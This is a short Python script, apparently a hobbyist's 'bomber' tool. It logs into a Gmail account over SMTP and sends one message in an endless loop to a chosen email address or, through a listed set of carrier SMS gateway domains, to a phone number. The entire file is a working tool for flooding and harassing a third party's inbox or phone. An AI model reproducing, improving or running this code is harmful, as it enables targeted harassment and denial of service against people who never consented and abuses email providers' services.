# Age 15 sadly
# made by linuxfisher


import smtplib as s
from termcolor import cprint 



cprint("""          __________              ___.                 
          \______   \ ____   _____\_ |__   ___________ 
           |    |  _//  _ \ /     \| __ \_/ __ \_  __ \\
           |    |   (  <_> )  Y Y  \ \_\ \  ___/|  | \/
           |______  /\____/|__|_|  /___  /\___  >__|    
                  \/             \/    \/     \/       
                     make a new insecure Gmail 
                        by linux-fisher""", 'blue', attrs=['bold']) 

user = input("\033[1;91mEnter your email:\033[1;m ") 
passw = input("\033[1;91mEnter your Password:\033[1;m ")
try:
    orm = s.SMTP("smtp.gmail.com:587") 
    orm.starttls() 
    orm.login(user, passw) 
except: 
    print("[!]Account is too secure or you put the wrong info") 
    exit(0)
print("\n") 
 

#mp = input(">>> ") 

print(""" Pick a carrier for smsBOMBing
     	1. Alltel - @alltelmessage.com 
	2. AT&T - @txt.att.net
	3. Rogers - @pcs.rogers.com
	4. Sprint - @messaging.sprintpcs.com	
     	5. T-Mobile - @tmomail.net
	6. Telus - @msg.telus.com
	7. Verizon - @vtext.com
	8. Virgin Mobile - vmobl.com
	9. Orange - @sms.orange.pl
    10. metro - @mymetropcs.com        
         
        EX: for smsBombing 47372434@tmomail.com
             
        EX: for emailBombing jdjei@gmail.com""") 
print("\n")    
carrir = input("[S]SMS or [E]email bombing?: ")

if carrir == 'S':
    cayr = input("Enter the Carrier of that phone: ")
    p = input(">phone number: ") + str(cayr)
    msg = input(">Enter msg: ")     
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (user, "" .join(p), "" .join(msg)))
elif carrir == 'E': 
    p = input("Enter Email: ") 
    msg = input("Enter msg: ")
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (user, "" .join(p), "" .join(msg)))


while 'S' or 'E': 
    try:
        orm.sendmail(user, p, phone_message)  
        print("HAS BEEN SENT!!!!!!!!!!!!")
    except KeyboardInterrupt: 
        print("QUITED.......")

